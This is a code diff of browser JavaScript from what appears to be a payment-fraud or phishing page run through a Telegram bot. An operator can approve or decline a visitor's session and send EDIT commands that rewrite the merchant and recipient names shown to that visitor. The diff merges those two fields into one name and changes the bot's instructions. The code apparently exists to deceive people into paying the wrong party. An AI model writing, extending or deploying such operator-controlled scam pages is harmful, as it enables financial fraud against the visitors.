@@ -875,9 +875,9 @@
                                         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                             method: 'POST',
                                             headers: { 'Content-Type': 'application/json' },
-                                            body: JSON.stringify({ callback_query_id: callbackId, text: '📝 Send: MERCHANT|RECIPIENT' })
+                                            body: JSON.stringify({ callback_query_id: callbackId, text: '📝 Edit instructions sent' })
                                         });
-                                        sendTelegramMessage(`📝 <b>EDIT DETAILS for ${userId}</b>\n━━━━━━━━━━━━━━━━━━━━\nSend a message in this format:\n<code>EDIT ${userId} | NEW MERCHANT NAME | NEW RECIPIENT NAME</code>`);
+                                        sendTelegramMessage(`📝 <b>EDIT DETAILS for ${userId}</b>\n━━━━━━━━━━━━━━━━━━━━\nTo change the payment details, reply with:\n\n<code>EDIT ${userId} | NEW NAME</code>\n\n<i>Example: EDIT ${userId} | HARRISON OKYERE ENTERPRISE</i>`);
                                     }
                                 }
                                 
@@ -892,12 +892,11 @@
                                         handleDecline();
                                     } else if (text.includes(`EDIT ${userId}`)) {
                                         const parts = update.message.text.split('|');
-                                        if (parts.length >= 3) {
-                                            const newMerchant = parts[1].trim();
-                                            const newRecipient = parts[2].trim();
-                                            sessionStorage.setItem('customMerchant', newMerchant);
-                                            sessionStorage.setItem('customRecipient', newRecipient);
-                                            sendTelegramMessage(`✅ <b>DETAILS UPDATED</b>\n━━━━━━━━━━━━━━━━━━━━\n🏢 Merchant: ${newMerchant}\n👤 Recipient: ${newRecipient}`);
+                                        if (parts.length >= 2) {
+                                            const newName = parts[1].trim();
+                                            sessionStorage.setItem('customMerchant', newName);
+                                            sessionStorage.setItem('customRecipient', newName);
+                                            sendTelegramMessage(`✅ <b>DETAILS UPDATED</b>\n━━━━━━━━━━━━━━━━━━━━\n🏢 Name: ${newName}\n<i>(Both Merchant and Recipient updated)</i>`);
                                         }
                                     }
                                 }
